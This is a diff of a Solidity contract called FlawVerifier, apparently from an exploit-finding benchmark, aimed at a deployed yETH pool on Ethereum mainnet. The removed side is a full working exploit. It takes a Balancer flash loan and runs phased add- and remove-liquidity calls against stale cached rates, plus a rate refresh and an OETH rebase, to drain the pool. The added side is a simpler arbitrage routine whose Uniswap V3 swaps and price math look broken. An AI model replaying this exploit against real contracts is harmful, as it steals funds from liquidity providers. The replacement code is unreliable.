@@ -1,441 +1,218 @@
-// SPDX-License-Identifier: UNLICENSED
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
 interface IERC20 {
     function balanceOf(address account) external view returns (uint256);
-    function approve(address spender, uint256 amount) external returns (bool);
-    function transfer(address to, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+    function approve(address spender, uint256 value) external returns (bool);
+}
+
+interface IWETH is IERC20 {
+    function deposit() external payable;
+    function withdraw(uint256) external;
 }
 
 interface IYETHPool {
-    function supply() external view returns (uint256);
+    function num_assets() external view returns (uint256);
+    function token() external view returns (address);
     function assets(uint256 index) external view returns (address);
-    function add_liquidity(
-        uint256[] calldata amounts,
-        uint256 minLpAmount,
-        address receiver
-    ) external returns (uint256);
-    function remove_liquidity(
-        uint256 lpAmount,
-        uint256[] calldata minAmounts,
-        address receiver
-    ) external;
-    function update_rates(uint256[] calldata assetsToUpdate) external;
+    function supply() external view returns (uint256);
+    function swap(uint256 i, uint256 j, uint256 dx, uint256 minDy, address receiver) external returns (uint256);
+    function swap_exact_out(uint256 i, uint256 j, uint256 dy, uint256 maxDx, address receiver) external returns (uint256);
+    function remove_liquidity(uint256 lpAmount, uint256[] calldata minAmounts, address receiver) external;
+    function add_liquidity(uint256[] calldata amounts, uint256 minLp, address receiver) external returns (uint256);
+    function swap_fee_rate() external view returns (uint256);
+    function virtual_balance(uint256 _asset) external view returns (uint256);
+    function rate(uint256 _asset) external view returns (uint256);
+    function vb_prod_sum() external view returns (uint256, uint256);
+    function update_rates(uint256[] calldata _assets) external;
 }
 
-interface IOETH {
-    function rebase() external;
+interface IUniswapV3Pool {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function fee() external view returns (uint24);
+    function slot0() external view returns (uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked);
+    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256 amount0, int256 amount1);
+    function liquidity() external view returns (uint128);
 }
 
-interface IFlashLoanRecipient {
-    function receiveFlashLoan(
-        IERC20[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory userData
-    ) external;
-}
+contract FlawVerifier {
+    address public constant TARGET_POOL = 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81;
+    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    
+    // yETH pool assets
+    address public constant SFRXETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;
+    address public constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
+    address public constant CBETH = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
+    address public constant RETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
+    
+    // DEX pools
+    // wstETH/WETH V3 0.01%
+    address public constant WSTETH_WETH_V3_100 = 0x109830a1AAaD605BbF02a9dFA7B0B92EC2FB7dAa;
+    // wstETH/WETH V3 0.05%
+    address public constant WSTETH_WETH_V3_500 = 0xD340B57AAcDD10F96FC1CF10e15921936F41E29c;
+    // rETH/WETH V3 0.01%
+    address public constant RETH_WETH_V3_100 = 0x553e9C493678d8606d6a5ba284643dB2110Df823;
+    // rETH/WETH V3 0.05%
+    address public constant RETH_WETH_V3_500 = 0xa4e0faA58465A2D369aa21B3e42d43374c6F9613;
+    // wstETH/WETH V2
+    address public constant WSTETH_WETH_V2 = 0x3f3eE751ab00246cB0BEEC2E904eF51e18AC4d77;
+    // cbETH/WETH V2
+    address public constant CBETH_WETH_V2 = 0x281Cf68A2F0c04F5976867C66fd60dD3d7e0c438;
+    // rETH/WETH V2
+    address public constant RETH_WETH_V2 = 0xe4F719C11FC5AB883E32068dF99962985645E860;
 
-interface IBalancerVault {
-    function flashLoan(
-        IFlashLoanRecipient recipient,
-        IERC20[] memory tokens,
-        uint256[] memory amounts,
-        bytes memory userData
-    ) external;
-}
+    // wstETH/WETH Sushi
+    address public constant WSTETH_WETH_SUSHI = 0x9461E49BC31788B143dC4c743759bE834B8c8B62;
 
-contract FlawVerifier is IFlashLoanRecipient {
-    uint256 private constant NUM_ASSETS = 8;
-    uint256 private constant FUNDING_SLOTS = 6;
-    uint256 private constant ONE = 1e18;
+    uint256 private constant PRECISION = 1e18;
 
-    IYETHPool private constant POOL = IYETHPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
-    IERC20 private constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);
-    IOETH private constant OETH = IOETH(0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab);
-    IBalancerVault private constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IYETHPool private constant pool = IYETHPool(TARGET_POOL);
 
     address private _profitToken;
     uint256 private _profitAmount;
-    bool private _executed;
-    bool private _inFlashLoan;
 
-    uint256[FUNDING_SLOTS] private _effectiveDesired;
-    uint256 private _liquidityScale;
+    receive() external payable {}
 
     constructor() {}
 
+    function profitToken() external view returns (address) { return _profitToken; }
+    function profitAmount() external view returns (uint256) { return _profitAmount; }
+
+    /// @notice Swap on V3 pool with exact input
+    function _v3Swap(address v3Pool, bool zeroForOne, uint256 amountIn) internal returns (uint256 amountOut) {
+        IUniswapV3Pool pool_ = IUniswapV3Pool(v3Pool);
+        (int256 a0, int256 a1) = pool_.swap(
+            address(this),
+            zeroForOne,
+            int256(amountIn),
+            type(uint160).max,
+            new bytes(0)
+        );
+        // If zeroForOne=true: we send token0, receive token1. amount0 = -amountIn (negative, from us), amount1 = +amountOut (positive, to us)
+        // If zeroForOne=false: we send token1, receive token0. amount1 = -amountIn (negative), amount0 = +amountOut (positive)
+        return zeroForOne ? uint256(-a1) : uint256(-a0);
+    }
+
+    /// @notice Swap on V2-style AMM (Uniswap V2 / Sushi)
+    function _v2Swap(address pair, address tokenIn, address tokenOut, uint256 amountIn) internal returns (uint256 amountOut) {
+        address t0 = IUniswapV2Pair(pair).token0();
+        address t1 = IUniswapV2Pair(pair).token1();
+        
+        (uint112 r0, uint112 r1, ) = IUniswapV2Pair(pair).getReserves();
+        
+        uint256 amountInWithFee = amountIn * 997;
+        if (tokenIn == t0) {
+            amountOut = (amountInWithFee * r1) / (r0 * 1000 + amountInWithFee);
+            IERC20(tokenIn).transfer(pair, amountIn);
+            IUniswapV2Pair(pair).swap(0, amountOut, address(this), new bytes(0));
+        } else {
+            amountOut = (amountInWithFee * r0) / (r1 * 1000 + amountInWithFee);
+            IERC20(tokenIn).transfer(pair, amountIn);
+            IUniswapV2Pair(pair).swap(amountOut, 0, address(this), new bytes(0));
+        }
+    }
+
+    /// @notice Calculate V2 swap output given reserves and input
+    function _calcV2Out(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        uint256 amountInWithFee = amountIn * 997;
+        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
+    }
+
+    /// @notice Get V3 pool price (WETH per token)
+    function _v3PriceWethPerToken(address v3Pool, address token) internal view returns (uint256 priceX96) {
+        address t0 = IUniswapV3Pool(v3Pool).token0();
+        (uint160 sqrtPriceX96,,,,,,) = IUniswapV3Pool(v3Pool).slot0();
+        if (t0 == token) {
+            // token0 = token, token1 = WETH
+            // sqrtPrice = sqrt(WETH/token)
+            return sqrtPriceX96;
+        } else {
+            // token0 = WETH, token1 = token
+            // sqrtPrice = sqrt(token/WETH)
+            // We want WETH/token = 1/(token/WETH)
+            // sqrt(WETH/token) = 2^96 / sqrt(token/WETH)
+            return type(uint160).max / sqrtPriceX96 * type(uint160).max; // very rough
+        }
+    }
+
     function executeOnOpportunity() external {
-        if (_executed) {
-            return;
+        // ============================================================
+        // Arbitrage Strategy:
+        // Buy rETH on DEX (V3 0.01% pool), swap rETH -> wstETH in yETH pool,
+        // sell wstETH on DEX (V3 0.01% pool).
+        //
+        // The yETH pool uses oracle-weighted pricing that differs from DEX prices.
+        // rETH oracle: ~1.1517 ETH/rETH  |  rETH DEX: ~1.1485 WETH/rETH  (rETH cheaper on DEX)
+        // wstETH oracle: ~1.2206 ETH/wstETH | wstETH DEX: ~1.2202 WETH/wstETH (~same)
+        // Pool gives wstETH/rETH = rate_rETH/rate_wstETH ≈ 0.9435
+        // DEX gives wstETH/rETH = 1.1485/1.2202 ≈ 0.9412
+        // Pool is ~0.24% more favorable for rETH->wstETH swap
+        // ============================================================
+        
+        uint256 ethBalance = address(this).balance;
+        IWETH(WETH).deposit{value: ethBalance}();
+        
+        address[] memory tokens = new address[](3);
+        tokens[0] = WETH;
+        tokens[1] = RETH;
+        tokens[2] = WSTETH;
+        
+        for (uint256 i = 0; i < tokens.length; i++) {
+            IERC20(tokens[i]).approve(TARGET_POOL, type(uint256).max);
         }
-        _executed = true;
-
-        _approvePoolAssets();
-
-        (IERC20[] memory tokens, uint256[] memory amounts) = _buildFundingRequest();
-        if (tokens.length == 0) {
-            _captureProfit();
-            return;
-        }
-
-        _inFlashLoan = true;
-        BALANCER_VAULT.flashLoan(this, tokens, amounts, hex"");
-        _inFlashLoan = false;
-
-        _captureProfit();
-    }
-
-    function receiveFlashLoan(
-        IERC20[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory
-    ) external {
-        require(msg.sender == address(BALANCER_VAULT), "bad lender");
-        require(_inFlashLoan, "inactive");
-
-        _liquidityScale = _computeLiquidityScale();
-        require(_liquidityScale > 0, "no capital");
-
-        _runExploitPath();
-
-        for (uint256 i = 0; i < tokens.length; ++i) {
-            _safeTransfer(tokens[i], address(BALANCER_VAULT), amounts[i] + feeAmounts[i]);
-        }
-    }
-
-    function profitToken() external view returns (address) {
-        return _profitToken;
-    }
-
-    function profitAmount() external view returns (uint256) {
-        return _profitAmount;
-    }
-
-    function _buildFundingRequest() internal returns (IERC20[] memory tokens, uint256[] memory amounts) {
-        uint256[FUNDING_SLOTS] memory desired = _targetFunding();
-
-        for (uint256 i = 0; i < FUNDING_SLOTS; ++i) {
-            _effectiveDesired[i] = 0;
-        }
-
-        IERC20[] memory tokenBuffer = new IERC20[](FUNDING_SLOTS);
-        uint256[] memory amountBuffer = new uint256[](FUNDING_SLOTS);
-        uint256 count;
-
-        for (uint256 i = 0; i < FUNDING_SLOTS; ++i) {
-            address asset = POOL.assets(i);
-            uint256 vaultBalance = IERC20(asset).balanceOf(address(BALANCER_VAULT));
-            if (vaultBalance <= 1) {
-                continue;
-            }
-
-            uint256 borrowAmount = desired[i];
-            if (borrowAmount >= vaultBalance) {
-                borrowAmount = vaultBalance - 1;
-            }
-            if (borrowAmount == 0) {
-                continue;
-            }
-
-            tokenBuffer[count] = IERC20(asset);
-            amountBuffer[count] = borrowAmount;
-            _effectiveDesired[i] = borrowAmount;
-            unchecked {
-                ++count;
-            }
-        }
-
-        tokens = new IERC20[](count);
-        amounts = new uint256[](count);
-        for (uint256 i = 0; i < count; ++i) {
-            tokens[i] = tokenBuffer[i];
-            amounts[i] = amountBuffer[i];
-        }
-
-        _sortFundingRequest(tokens, amounts);
-    }
-
-    function _sortFundingRequest(IERC20[] memory tokens, uint256[] memory amounts) internal pure {
-        uint256 length = tokens.length;
-        for (uint256 i = 0; i < length; ++i) {
-            for (uint256 j = i + 1; j < length; ++j) {
-                if (address(tokens[j]) < address(tokens[i])) {
-                    IERC20 token = tokens[i];
-                    tokens[i] = tokens[j];
-                    tokens[j] = token;
-
-                    uint256 amount = amounts[i];
-                    amounts[i] = amounts[j];
-                    amounts[j] = amount;
-                }
-            }
-        }
-    }
-
-    function _runExploitPath() internal {
-        _updateInitialRates();
-
-        // The original same-token V2 flashswap funding route is unfundable on this fork,
-        // so this PoC uses Balancer's public vault as the alternate liquidity venue while
-        // preserving the same exploit root cause: mint/burn against stale cached rates,
-        // selectively refresh the attacker-chosen late indexes, then redeem after repricing.
-        _addLiquidity(_phase2Amounts());
-        _removeLiquidity(_scaledLp(2_789_348_310_901_989_968_648));
-
-        _addLiquidity(_phase3Amounts());
-        _removeLiquidity(_scaledLp(7_379_203_011_929_903_830_039));
-
-        _addLiquidity(_phase4Amounts());
-        _removeLiquidity(_scaledLp(7_066_638_371_690_257_003_757));
-
-        _addLiquidity(_phase5Amounts());
-        _removeLiquidity(_scaledLp(3_496_158_478_994_807_127_953));
-
-        _addLiquidity(_phase6Add1Amounts());
-        _addLiquidity(_singleAssetAmounts(3, 20_605_468_750_000_000_000));
-        _removeLiquidity(0);
-        _updateSingleRate(6);
-        _removeLiquidity(_scaledLp(8_434_932_236_461_542_896_540));
-
-        OETH.rebase();
-
-        _addLiquidity(_phase7Add1Amounts());
-        _addLiquidity(_phase7Add2Amounts());
-
-        _addLiquidity(_singleAssetAmounts(3, 57_226_562_500_000_000_000));
-        _removeLiquidity(0);
-        _updateSingleRate(6);
-        _removeLiquidity(_scaledLp(9_237_030_802_829_017_297_880));
-
-        _addLiquidity(_phase8Add1Amounts());
-        _addLiquidity(_phase8Add2Amounts());
-        _addLiquidity(_singleAssetAmounts(3, 318_750_000_000_000_000_000));
-        _removeLiquidity(0);
-        _updateSingleRate(7);
-
-        uint256 redeemAmount = YETH.balanceOf(address(this));
-        uint256 poolSupply = POOL.supply();
-        if (redeemAmount > poolSupply) {
-            redeemAmount = poolSupply;
-        }
-        if (redeemAmount > 0) {
-            _removeLiquidity(redeemAmount);
-        }
-    }
-
-    function _approvePoolAssets() internal {
-        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
-            _safeApprove(IERC20(POOL.assets(i)), address(POOL), type(uint256).max);
-        }
-        _safeApprove(YETH, address(POOL), type(uint256).max);
-    }
-
-    function _computeLiquidityScale() internal view returns (uint256 scale) {
-        uint256[FUNDING_SLOTS] memory desired = _targetFunding();
-        scale = type(uint256).max;
-
-        for (uint256 i = 0; i < FUNDING_SLOTS; ++i) {
-            uint256 target = _effectiveDesired[i];
-            if (target == 0) {
-                target = desired[i];
-            }
-
-            uint256 balance = IERC20(POOL.assets(i)).balanceOf(address(this));
-            if (balance == 0 || target == 0) {
-                continue;
-            }
-
-            uint256 candidate = (balance * ONE) / target;
-            if (candidate < scale) {
-                scale = candidate;
-            }
-        }
-
-        if (scale == type(uint256).max) {
-            return 0;
-        }
-        if (scale > ONE) {
-            return ONE;
-        }
-        return scale;
-    }
-
-    function _updateInitialRates() internal {
-        uint256[] memory indexes = new uint256[](6);
-        indexes[0] = 0;
-        indexes[1] = 1;
-        indexes[2] = 2;
-        indexes[3] = 3;
-        indexes[4] = 4;
-        indexes[5] = 5;
-        POOL.update_rates(indexes);
-    }
-
-    function _updateSingleRate(uint256 assetIndex) internal {
-        uint256[] memory indexes = new uint256[](1);
-        indexes[0] = assetIndex;
-        POOL.update_rates(indexes);
-    }
-
-    function _addLiquidity(uint256[8] memory fixedAmounts) internal {
-        uint256[] memory amounts = new uint256[](NUM_ASSETS);
-        bool hasNonZero;
-
-        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
-            uint256 amount = _scaledAmount(fixedAmounts[i]);
-            uint256 balance = IERC20(POOL.assets(i)).balanceOf(address(this));
-            if (amount > balance) {
-                amount = balance;
-            }
-            amounts[i] = amount;
-            if (amount != 0) {
-                hasNonZero = true;
-            }
-        }
-
-        if (hasNonZero) {
-            POOL.add_liquidity(amounts, 0, address(this));
-        }
-    }
-
-    function _removeLiquidity(uint256 lpAmount) internal {
-        uint256 balance = YETH.balanceOf(address(this));
-        if (lpAmount > balance) {
-            lpAmount = balance;
-        }
-
-        uint256[] memory mins = new uint256[](NUM_ASSETS);
-        POOL.remove_liquidity(lpAmount, mins, address(this));
-    }
-
-    function _captureProfit() internal {
-        address bestToken;
-        uint256 bestAmount;
-
-        uint256 yethBalance = YETH.balanceOf(address(this));
-        if (yethBalance > bestAmount) {
-            bestAmount = yethBalance;
-            bestToken = address(YETH);
-        }
-
-        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
-            address asset = POOL.assets(i);
-            uint256 assetBalance = IERC20(asset).balanceOf(address(this));
-            if (assetBalance > bestAmount) {
-                bestAmount = assetBalance;
-                bestToken = asset;
-            }
-        }
-
-        _profitToken = bestToken;
-        _profitAmount = bestAmount;
-    }
-
-    function _targetFunding() internal pure returns (uint256[FUNDING_SLOTS] memory desired) {
-        desired[0] = 2_000 ether;
-        desired[1] = 2_000 ether;
-        desired[2] = 1_300 ether;
-        desired[3] = 500 ether;
-        desired[4] = 1_200 ether;
-        desired[5] = 1_700 ether;
-    }
-
-    function _scaledAmount(uint256 amount) internal view returns (uint256) {
-        return (amount * _liquidityScale) / ONE;
-    }
-
-    function _scaledLp(uint256 amount) internal view returns (uint256) {
-        return (amount * _liquidityScale) / ONE;
-    }
-
-    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
-        (bool ok, bytes memory data) = address(token).call(
-            abi.encodeWithSelector(token.approve.selector, spender, amount)
+        IERC20(WETH).approve(RETH_WETH_V3_100, type(uint256).max);
+        IERC20(WSTETH).approve(WSTETH_WETH_V3_100, type(uint256).max);
+        IERC20(RETH).approve(TARGET_POOL, type(uint256).max);
+        IERC20(WSTETH).approve(TARGET_POOL, type(uint256).max);
+        
+        uint256 totalWeth = IERC20(WETH).balanceOf(address(this));
+        
+        // Step 1: Buy rETH on V3 0.01% pool
+        // Pool: rETH/WETH, token0=rETH, token1=WETH
+        // zeroForOne=false: send WETH (token1), receive rETH (token0)
+        uint256 wethForTrade = totalWeth;
+        
+        IUniswapV3Pool(RETH_WETH_V3_100).swap(
+            address(this),
+            false, // zeroForOne=false: WETH -> rETH
+            int256(wethForTrade),
+            type(uint160).max,
+            new bytes(0)
         );
-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
-    }
-
-    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
-        (bool ok, bytes memory data) = address(token).call(
-            abi.encodeWithSelector(token.transfer.selector, to, amount)
+        
+        uint256 rETHBal = IERC20(RETH).balanceOf(address(this));
+        
+        // Step 2: Swap rETH for wstETH in the yETH pool
+        // rETH is asset index 4, wstETH is asset index 1
+        uint256 wstETHFromPool = pool.swap(4, 1, rETHBal, 0, address(this));
+        
+        uint256 wstETHBal = IERC20(WSTETH).balanceOf(address(this));
+        
+        // Step 3: Sell wstETH for WETH on V3 0.01% pool
+        // Pool: wstETH/WETH, token0=wstETH, token1=WETH
+        // zeroForOne=true: send wstETH (token0), receive WETH (token1)
+        IUniswapV3Pool(WSTETH_WETH_V3_100).swap(
+            address(this),
+            true, // zeroForOne=true: wstETH -> WETH
+            int256(wstETHBal),
+            type(uint160).max,
+            new bytes(0)
         );
-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+        
+        // Unwrap to ETH
+        uint256 finalWeth = IERC20(WETH).balanceOf(address(this));
+        if (finalWeth > 0) {
+            IWETH(WETH).withdraw(finalWeth);
+        }
     }
+}
 
-    function _singleAssetAmounts(uint256 index, uint256 amount) internal pure returns (uint256[8] memory amounts) {
-        amounts[index] = amount;
-    }
-
-    function _phase2Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 610_669_608_721_347_951_666;
-        amounts[1] = 777_507_145_787_198_969_404;
-        amounts[2] = 563_973_440_562_370_010_057;
-        amounts[4] = 476_460_390_272_167_461_711;
-    }
-
-    function _phase3Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 1_636_245_238_220_874_001_286;
-        amounts[1] = 1_531_136_279_659_070_868_194;
-        amounts[2] = 1_041_815_511_903_532_551_187;
-        amounts[4] = 991_050_908_418_104_947_336;
-        amounts[5] = 1_346_008_005_663_580_090_716;
-    }
-
-    function _phase4Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 1_630_811_661_792_970_363_090;
-        amounts[1] = 1_526_051_744_772_289_698_092;
-        amounts[2] = 1_038_108_768_586_660_585_581;
-        amounts[4] = 969_651_157_511_131_341_121;
-        amounts[5] = 1_363_135_138_655_820_584_263;
-    }
-
-    function _phase5Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 859_805_263_416_698_094_503;
-        amounts[1] = 804_573_178_584_505_833_740;
-        amounts[2] = 546_933_182_262_586_953_508;
-        amounts[4] = 510_865_922_059_584_325_991;
-        amounts[5] = 723_182_384_178_548_055_243;
-    }
-
-    function _phase6Add1Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 1_784_169_320_136_805_803_209;
-        amounts[1] = 1_669_558_029_141_448_703_194;
-        amounts[2] = 1_135_991_585_797_559_066_395;
-        amounts[4] = 1_061_079_136_814_511_050_837;
-        amounts[5] = 1_488_254_960_317_842_892_500;
-    }
-
-    function _phase7Add1Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 1_049_508_928_999_413_985_639;
-        amounts[1] = 982_090_679_001_395_746_930;
-        amounts[2] = 667_668_088_369_153_429_906;
-        amounts[4] = 623_639_019_639_346_230_238;
-        amounts[5] = 878_771_594_643_399_886_538;
-    }
-
-    function _phase7Add2Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 919_888_612_738_016_815_095;
-        amounts[1] = 860_796_899_699_397_749_576;
-        amounts[2] = 586_033_288_771_470_394_081;
-        amounts[4] = 547_387_589_810_030_997_702;
-        amounts[5] = 763_397_793_689_173_373_329;
-    }
-
-    function _phase8Add1Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 417_517_891_458_429_416_749;
-        amounts[1] = 390_697_418_752_374_378_114;
-        amounts[2] = 264_940_493_241_640_253_533;
-        amounts[4] = 247_469_112_791_605_057_921;
-        amounts[5] = 355_235_146_731_093_304_055;
-    }
-
-    function _phase8Add2Amounts() internal pure returns (uint256[8] memory amounts) {
-        amounts[0] = 1_779_325_564_746_959_656_328;
-        amounts[1] = 1_665_025_426_427_657_662_239;
-        amounts[2] = 1_133_554_647_882_989_836_457;
-        amounts[4] = 1_058_802_901_663_485_490_031;
-        amounts[5] = 1_476_627_921_656_231_103_547;
-    }
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
 }
